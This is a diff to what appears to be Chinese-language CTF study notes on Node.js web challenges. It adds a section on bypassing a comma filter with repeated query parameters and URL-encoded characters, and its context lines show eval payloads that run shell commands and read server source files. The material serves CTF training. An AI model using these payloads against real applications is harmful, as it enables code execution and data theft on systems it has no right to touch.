@@ -61,7 +61,30 @@ eval(require("child_process").execSync('ls'))
 ?eval=require('fs').readFileSync('/app/routes/index.js', 'utf-8')   查看源码
 ```
 
+^
+## **传参绕过**
+传json，不能有，2c字符。
+```
+router.get('/', function(req, res, next) {
+  res.type('html');
+  var flag = 'flag_here';
+  if(req.url.match(/8c|2c|\,/ig)){
+  	res.end('where is flag :)');
+  }
+  var query = JSON.parse(req.query.query);
+  if(query.name==='admin'&&query.password==='ctfshow'&&query.isVIP===true){
+  	res.end(flag);
+  }else{
+  	res.end('where is flag. :)');
+  }
+});
+```
+```
+/?query={"name":"admin","password":"ctfshow","isVIP":true} 被检测到,
 
+同名参数绕过，这里还要把c进行url编码，否则"c会匹配到2c
+?query={"name":"admin"&query="password":"%63tfshow"&query="isVIP":true}
+```
 
 ^
 ## **原型链污染**
